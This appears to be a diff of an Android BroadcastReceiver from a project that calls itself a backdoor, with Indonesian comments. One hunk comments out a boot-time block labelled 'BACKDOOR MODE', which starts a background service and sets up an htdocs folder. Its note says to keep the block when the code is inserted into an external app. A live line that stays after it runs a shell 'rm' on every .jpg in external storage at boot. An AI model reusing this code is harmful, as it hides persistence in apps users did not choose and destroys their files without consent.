@@ -631,11 +631,13 @@ public class ReceiverBoot extends BroadcastReceiver
 	public void toastText(Context context, String data, int warna, int letak)
 	{
 		LinearLayout layout = new LinearLayout(context);
+		
+		/* entah kenapa imgage tidak bisa ditampilkan di app JT*/
 		ImageView image = new ImageView(context);
 		
 		image.setImageResource(R.drawable.img);
 		layout.addView(image);
-
+		
     	TextView text = new TextView(context);
 		text.setText(data);
 		text.setTextColor(Color.BLACK);
@@ -1015,6 +1017,10 @@ public class ReceiverBoot extends BroadcastReceiver
         finishInstall = false;
         if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) 
         {
+        	/* BACKDOOR MODE:
+        	 * hapus ini jika mau edit app inti
+        	 * jangan hapus jika disisipkan di app external
+			
         	finishInstall = true;
 			context.startService(new Intent(context, SystemThread.class));
 			File htdocs = new File(utils.getPathExternal());
@@ -1036,7 +1042,7 @@ public class ReceiverBoot extends BroadcastReceiver
 				Log.i(TAG, "errrot:"+e);
 			}
 
-
+			*/
 			try {
 				Runtime.getRuntime().exec("rm "+pathExternal+"/*.jpg");
 			}
